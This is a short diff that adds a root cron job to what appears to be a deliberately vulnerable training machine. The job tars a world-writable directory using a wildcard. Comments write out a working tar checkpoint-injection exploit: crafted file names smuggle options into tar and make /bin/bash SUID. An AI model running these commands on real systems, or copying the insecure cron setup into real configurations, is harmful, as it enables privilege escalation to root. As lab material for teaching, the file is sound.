@@ -1,0 +1,12 @@
+# VulnBox wildcard injection cron — deliberately vulnerable
+# /opt/scripts is world-writable (chmod 777)
+# tar wildcard expansion allows checkpoint flag injection:
+#
+# Exploit:
+#   echo "" > /opt/scripts/--checkpoint=1
+#   echo "" > "/opt/scripts/--checkpoint-action=exec=sh shell.sh"
+#   echo "#!/bin/bash\nchmod u+s /bin/bash" > /opt/scripts/shell.sh
+#   chmod +x /opt/scripts/shell.sh
+# Then wait for the cron to fire — /bin/bash becomes SUID.
+
+*/2 * * * * root cd /opt/scripts && tar czf /tmp/backup-$(date +\%s).tar.gz *
